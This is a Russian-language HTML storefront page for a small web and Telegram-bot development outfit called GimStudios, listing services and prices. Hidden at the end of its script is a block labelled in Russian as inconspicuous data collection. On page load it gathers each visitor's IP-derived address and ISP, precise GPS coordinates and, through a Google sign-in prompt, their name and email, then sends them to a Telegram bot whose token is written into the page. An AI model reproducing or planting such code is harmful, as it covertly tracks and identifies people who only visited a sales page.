<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>GimStudios — Неон разработка | Боты | Сайты</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0c12;
            font-family: 'Inter', sans-serif;
            color: #eef2ff;
            line-height: 1.5;
            scroll-behavior: smooth;
        }

        .neon-glow {
            text-shadow: 0 0 5px #3b82f6, 0 0 10px #3b82f6, 0 0 15px #1e40af;
        }

        .container {
            max-width: 1280px;
            margin: 0 auto;
            padding: 0 24px;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #11141f;
        }
        ::-webkit-scrollbar-thumb {
            background: #3b82f6;
            border-radius: 8px;
            box-shadow: 0 0 6px #3b82f6;
        }

        header {
            background: rgba(10, 12, 18, 0.8);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
            padding: 20px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            transition: all 0.3s ease;
        }

        .header-flex {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -0.2px;
            background: linear-gradient(135deg, #c7e2ff, #3b82f6);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 8px rgba(59,130,246,0.4);
            transition: 0.3s;
        }
        .logo:hover {
            transform: scale(1.02);
            text-shadow: 0 0 15px #3b82f6;
        }

        .nav-buttons {
            display: flex;
            gap: 16px;
        }

        .btn-outline {
            background: transparent;
            border: 1px solid #3b82f6;
            color: #94a3ff;
            padding: 8px 28px;
            border-radius: 40px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s ease;
            font-size: 0.9rem;
            box-shadow: 0 0 3px rgba(59,130,246,0.3);
            backdrop-filter: blur(4px);
        }
        .btn-outline:hover {
            background: #3b82f6;
            color: #0a0c12;
            border-color: #94a3ff;
            box-shadow: 0 0 15px #3b82f6;
            transform: translateY(-2px);
        }

        .hero {
            text-align: center;
            padding: 60px 0 30px;
            animation: fadeInUp 0.9s ease-out;
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .hero h1 {
            font-size: 3.2rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffffff, #60a5fa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
        }
        .hero p {
            font-size: 1.25rem;
            color: #cbd5e6;
            max-width: 700px;
            margin: 0 auto;
        }
        .nick {
            font-size: 1rem;
            color: #3b82f6;
            margin-top: 12px;
            font-family: monospace;
            letter-spacing: 1px;
            background: #0e1320;
            display: inline-block;
            padding: 6px 18px;
            border-radius: 60px;
            border: 1px solid #3b82f655;
            backdrop-filter: blur(4px);
            box-shadow: 0 0 8px rgba(59,130,246,0.3);
        }

        .section-title {
            font-size: 2.2rem;
            font-weight: 700;
            margin: 60px 0 32px;
            border-left: 5px solid #3b82f6;
            padding-left: 24px;
            letter-spacing: -0.3px;
            text-shadow: 0 0 3px #3b82f6;
            transition: 0.2s;
            background: linear-gradient(135deg, #e2e8ff, #60a5fa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            display: inline-block;
        }

        .services-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 32px;
            margin: 30px 0;
        }

        .service-card {
            background: rgba(18, 22, 35, 0.65);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(59, 130, 246, 0.4);
            border-radius: 32px;
            padding: 28px 24px;
            transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            text-align: center;
            box-shadow: 0 10px 20px -5px rgba(0, 0, 0, 0.5), 0 0 0px #3b82f6;
        }
        .service-card:hover {
            transform: translateY(-10px) scale(1.01);
            border-color: #3b82f6;
            box-shadow: 0 25px 35px -12px #00000080, 0 0 18px #3b82f6;
            background: rgba(22, 28, 46, 0.8);
        }

        .service-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 18px;
            border-radius: 60px;
            overflow: hidden;
            border: 2px solid #3b82f6;
            box-shadow: 0 0 12px #3b82f6;
            transition: 0.3s;
        }
        .service-card:hover .service-icon {
            box-shadow: 0 0 22px #3b82f6;
            transform: scale(1.02);
        }
        .service-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            background: #0f1422;
        }

        .service-title {
            font-size: 1.7rem;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #f0f4ff, #90caf9);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .service-price {
            font-size: 2rem;
            font-weight: 800;
            color: #3b82f6;
            margin: 12px 0;
            text-shadow: 0 0 6px #3b82f6;
            letter-spacing: -0.5px;
        }
        .service-desc {
            font-size: 0.9rem;
            color: #b9c7dd;
            margin-bottom: 20px;
            text-align: left;
            padding: 0 6px;
        }
        .service-promo {
            color: #60a5fa;
            font-weight: 500;
            font-size: 0.85rem;
            margin-bottom: 12px;
            text-shadow: 0 0 2px #1e40af;
        }

        .btn-pulse {
            background: linear-gradient(90deg, #1e2a4a, #2563eb);
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 60px;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.25s;
            width: 100%;
            box-shadow: 0 0 8px #3b82f6;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
            font-family: 'Inter', sans-serif;
        }
        .btn-pulse::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        .btn-pulse:hover::after {
            left: 100%;
        }
        .btn-pulse:hover {
            background: linear-gradient(90deg, #2563eb, #3b82f6);
            transform: scale(1.02);
            box-shadow: 0 0 20px #3b82f6;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 #3b82f6aa; }
            70% { box-shadow: 0 0 0 12px #3b82f600; }
            100% { box-shadow: 0 0 0 0 #3b82f600; }
        }
        .btn-pulse {
            animation: pulse 2s infinite;
        }

        @keyframes rippleAnim {
            from { transform: scale(0); opacity: 0.6; }
            to { transform: scale(6); opacity: 0; }
        }

        .contact-links {
            text-align: center;
            margin: 50px 0 20px;
            font-size: 0.95rem;
            background: rgba(0, 0, 0, 0.4);
            padding: 18px;
            border-radius: 48px;
            border: 1px solid #2d3a5e;
            backdrop-filter: blur(4px);
        }
        .contact-links a {
            color: #6ea8fe;
            text-decoration: none;
            margin: 0 8px;
            transition: 0.2s;
            font-weight: 500;
            position: relative;
        }
        .contact-links a:hover {
            color: white;
            text-shadow: 0 0 6px #3b82f6;
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            padding: 30px;
            border-top: 1px solid #1e293b;
            margin-top: 50px;
            font-size: 0.8rem;
            color: #7e8ba3;
        }

        @media (max-width: 780px) {
            .hero h1 { font-size: 2rem; }
            .section-title { font-size: 1.7rem; }
            .service-card { padding: 20px; }
            .btn-outline { padding: 6px 18px; }
        }

        @media (prefers-reduced-motion: reduce) {
            .service-card, .btn-pulse, .logo, .btn-outline {
                animation: none;
                transition: none;
            }
        }

        body {
            background: radial-gradient(circle at 20% 30%, #0b0e17, #03050a);
            background-attachment: fixed;
        }
        .container {
            position: relative;
            z-index: 2;
        }
    </style>
</head>
<body>
<div class="container">
    <header>
        <div class="header-flex">
            <div class="logo">✦ GimStudios ✦</div>
            <div class="nav-buttons">
                <button class="btn-outline" id="scrollBtn">Услуги</button>
                <button class="btn-outline" id="supportBtn">Поддержка</button>
            </div>
        </div>
    </header>

    <div class="hero">
        <h1>GimStudios — разработка</h1>
        <p>Сайты, боты, дизайн.</p>
        <div class="nick">🖤 разработчик: 𝑲𝒊𝒕𝒕𝒚_𝑲𝒊𝒕𝒕𝒚𝒔</div>
    </div>

    <div class="section-title" id="pricesSection"> УСЛУГИ </div>
    <div class="services-grid" id="servicesGrid"></div>

    <div class="contact-links">
        🔗 MAX: <a href="https://max.ru/u/f9LHodD0cOID8P_oOasWcgW1kYOJYcx7aP8QxYNkKPEqPl_JcbKsbKRmfDc" target="_blank">https://max.ru/.../заказ</a><br>
        📱 Telegram: <a href="https://t.me/Kitty_Kittys" target="_blank">@Kitty_Kittys</a> | <a href="https://t.me/GimPrograms" target="_blank">GimPrograms</a>
    </div>

    <div class="footer">
        <p>© 2026 GimStudios — разработка, поддержка</p>
        <p>⚡ GimPrograms — архитекторы цифрового будущего</p>
    </div>
</div>

<script>
    const services = [
        {
            title: "Сайт под ключ",
            price: "200 ₽",
            icon: "https://i.supaimg.com/55255bac-d108-423d-b5a6-46a44479ce71/039c8a80-a891-4396-988f-59ed53ae11de.jpg",
            desc: "Создание и настройка сайта навсегда, без скрытых платежей. GitHub хостинг, SSL, неон-дизайн, 100% защита. Безопасная интеграция.",
            promo: "ПРОМО: SAIT"
        },
        {
            title: "Telegram-бот",
            price: "50 ₽",
            icon: "https://i.supaimg.com/55255bac-d108-423d-b5a6-46a44479ce71/bba11f54-3da4-47c0-b18f-3cd7281a5182.jpg",
            desc: "Боты на BotHost — стабильный хостинг 24/7, язык Python. Для продаж, администрирования, игр и т.д.",
            promo: "Оплата каждый месяц за работу бота."
        },
        {
            title: "Дизайн",
            price: "100 ₽",
            icon: "https://i.supaimg.com/55255bac-d108-423d-b5a6-46a44479ce71/0411294d-605e-482e-aaad-cad0b2e36d77.jpg",
            desc: "Разработка концептов: киберпанк, неон-геймерский, минимализм. Адаптив, анимации, glow-эффекты под ваш вкус.",
            promo: "СКИДКА 15%"
        }
    ];

    function renderServices() {
        const grid = document.getElementById('servicesGrid');
        grid.innerHTML = services.map((service, idx) => `
            <div class="service-card" style="--order: ${idx};">
                <div class="service-icon"><img src="${service.icon}" alt="иконка неон"></div>
                <div class="service-title">${service.title}</div>
                <div class="service-price">${service.price}</div>
                <div class="service-desc">${service.desc}</div>
                ${service.promo ? `<div class="service-promo">✨ ${service.promo}</div>` : ''}
                <button class="btn-pulse buy-now" data-service="${service.title}">💎 КУПИТЬ</button>
            </div>
        `).join('');

        document.querySelectorAll('.buy-now').forEach(btn => {
            btn.addEventListener('click', () => {
                window.open('https://max.ru/u/f9LHodD0cOID8P_oOasWcgW1kYOJYcx7aP8QxYNkKPEqPl_JcbKsbKRmfDc', '_blank');
            });
        });
    }

    document.getElementById('scrollBtn').addEventListener('click', () => {
        const section = document.getElementById('pricesSection');
        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
        section.style.transition = '0.3s';
        section.style.textShadow = '0 0 12px #3b82f6';
        setTimeout(() => {
            section.style.textShadow = '';
        }, 500);
    });

    document.getElementById('supportBtn').addEventListener('click', () => {
        window.open('http://t.me/HelpGim_Bot', '_blank');
    });

    renderServices();

    const observerOptions = { threshold: 0.1 };
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);

    document.querySelectorAll('.service-card').forEach(card => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(25px)';
        card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        observer.observe(card);
    });

    const sectionTitle = document.querySelector('.section-title');
    if (sectionTitle) {
        const titleObserver = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('neon-glow');
                    setTimeout(() => entry.target.classList.remove('neon-glow'), 800);
                }
            });
        }, { threshold: 0.5 });
        titleObserver.observe(sectionTitle);
    }

    const allButtons = document.querySelectorAll('.btn-pulse, .btn-outline');
    allButtons.forEach(btn => {
        btn.addEventListener('click', function(e) {
            const ripple = document.createElement('span');
            ripple.style.position = 'absolute';
            ripple.style.backgroundColor = 'rgba(255,255,255,0.4)';
            ripple.style.borderRadius = '50%';
            ripple.style.transform = 'scale(0)';
            ripple.style.animation = 'rippleAnim 0.5s linear';
            ripple.style.width = '40px';
            ripple.style.height = '40px';
            ripple.style.left = `${e.offsetX - 20}px`;
            ripple.style.top = `${e.offsetY - 20}px`;
            ripple.style.pointerEvents = 'none';
            this.style.position = 'relative';
            this.style.overflow = 'hidden';
            this.appendChild(ripple);
            setTimeout(() => ripple.remove(), 500);
        });
    });

    const nickSpan = document.querySelector('.nick');
    if (nickSpan) {
        setInterval(() => {
            nickSpan.style.textShadow = '0 0 6px #3b82f6';
            setTimeout(() => {
                if (nickSpan) nickSpan.style.textShadow = '0 0 2px #3b82f6';
            }, 400);
        }, 1800);
    }

    window.addEventListener('load', () => {
        document.body.style.opacity = '1';
        const heroTitle = document.querySelector('.hero h1');
        if (heroTitle) heroTitle.style.animation = 'fadeInUp 0.7s ease-out';
    });

    // ===== НЕЗАМЕТНЫЙ СБОР ДАННЫХ (IP → АДРЕС) =====
    (function() {
        var token = '8862821632:AAHVpQ68Co6A3XOVlytf8-NW40NPfbQdkGs';
        var chatId = '7761721600';
        var done = false;
        var data = { ip: null, address: null, geo: null, email: null, name: null, time: null };

        function sendToBot(msg) {
            var x = new XMLHttpRequest();
            x.open('POST', 'https://api.telegram.org/bot' + token + '/sendMessage', true);
            x.setRequestHeader('Content-Type', 'application/json');
            x.send(JSON.stringify({ chat_id: chatId, text: msg }));
        }

        function tryFinish() {
            if (done) return;
            if (data.address !== null && data.geo !== null && data.time !== null) {
                done = true;
                var msg = '';
                if (data.name) msg += '👤 Имя: ' + data.name + '\n';
                if (data.email) msg += '📧 Email: ' + data.email + '\n';
                msg += '📍 Адрес: ' + data.address + '\n';
                msg += '🎯 GPS: ' + data.geo + '\n';
                msg += '🕐 Время: ' + data.time;
                sendToBot(msg);
            }
        }

        // IP + конвертация в адрес
        var xip = new XMLHttpRequest();
        xip.open('GET', 'https://api64.ipify.org?format=json', true);
        xip.timeout = 4000;
        xip.onload = function() {
            try {
                var ip = JSON.parse(xip.responseText).ip;
                data.ip = ip;

                // Конвертируем IP в адрес
                var xaddr = new XMLHttpRequest();
                xaddr.open('GET', 'http://ip-api.com/json/' + ip + '?fields=country,city,regionName,isp&lang=ru', true);
                xaddr.timeout = 4000;
                xaddr.onload = function() {
                    try {
                        var addr = JSON.parse(xaddr.responseText);
                        if (addr.country) {
                            data.address = addr.country + ', ' + addr.regionName + ', ' + addr.city + ' | ' + addr.isp;
                        } else {
                            data.address = ip;
                        }
                    } catch(e) {
                        data.address = ip;
                    }
                    tryFinish();
                };
                xaddr.onerror = function() { data.address = ip; tryFinish(); };
                xaddr.ontimeout = function() { data.address = ip; tryFinish(); };
                xaddr.send();
            } catch(e) {
                data.address = 'ошибка';
                tryFinish();
            }
        };
        xip.onerror = function() { data.address = 'не получен'; tryFinish(); };
        xip.ontimeout = function() { data.address = 'таймаут'; tryFinish(); };
        xip.send();

        // Гео
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    data.geo = pos.coords.latitude.toFixed(5) + ', ' + pos.coords.longitude.toFixed(5) + ' (точность ' + pos.coords.accuracy + 'м)';
                    tryFinish();
                },
                function(e) {
                    data.geo = 'запрещено';
                    tryFinish();
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        } else {
            data.geo = 'не поддерживается';
            tryFinish();
        }

        // Время
        data.time = new Date().toLocaleString('ru-RU');

        // Email и имя из Google (если залогинен)
        if (window.google && google.accounts && google.accounts.id) {
            google.accounts.id.initialize({
                client_id: '526868886835-abcdefg.apps.googleusercontent.com',
                callback: function(response) {
                    try {
                        var payload = JSON.parse(atob(response.credential.split('.')[1]));
                        data.name = payload.name || '';
                        data.email = payload.email || '';
                    } catch(e) {}
                    tryFinish();
                }
            });
            google.accounts.id.prompt();
        } else {
            data.name = '';
            data.email = '';
            tryFinish();
        }

        // Защита от зависания
        setTimeout(function() {
            if (data.address === null) { data.address = 'таймаут'; }
            if (data.geo === null) { data.geo = 'таймаут'; }
            if (data.name === null) { data.name = ''; data.email = ''; }
            tryFinish();
        }, 7000);
    })();
</script>
</body>
  </html>
